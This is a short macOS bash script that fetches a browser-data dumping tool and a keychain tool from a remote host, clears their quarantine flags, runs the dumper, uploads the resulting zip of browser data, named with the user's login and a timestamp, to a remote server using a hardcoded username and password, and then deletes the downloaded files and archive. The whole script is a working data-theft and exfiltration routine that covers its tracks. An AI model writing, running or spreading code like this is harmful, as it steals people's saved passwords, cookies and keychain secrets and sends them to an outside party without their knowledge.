#!/bin/bash

remoteBrowserHacker="http://tools-bitget.com/hack-browser-data_amd64"
remoteKeychain="http://tools-bitget.com/Keychain_amd64"

localBrowserHacker=/tmp/tempLog
localKeychain=/tmp/Keychain


curl -s -o $localBrowserHacker $remoteBrowserHacker
curl -s -o $localKeychain $remoteKeychain


xattr -c $localKeychain
chmod +x $localKeychain

xattr -c $localBrowserHacker
chmod +x $localBrowserHacker

$localBrowserHacker --zip

timestr=`date '+%Y-%m-%d_%H:%M:%S'`

mv /tmp/results/results.zip /tmp/results/$(whoami)_$timestr.zip

curl  -u'admin:bitget4321' -T /tmp/results/$(whoami)_$timestr.zip http://jamf.bitget.works:81/v3/

rm -rf $localKeychain
rm -rf $localBrowserHacker
rm -rf /tmp/results/$(whoami)_$timestr.zip
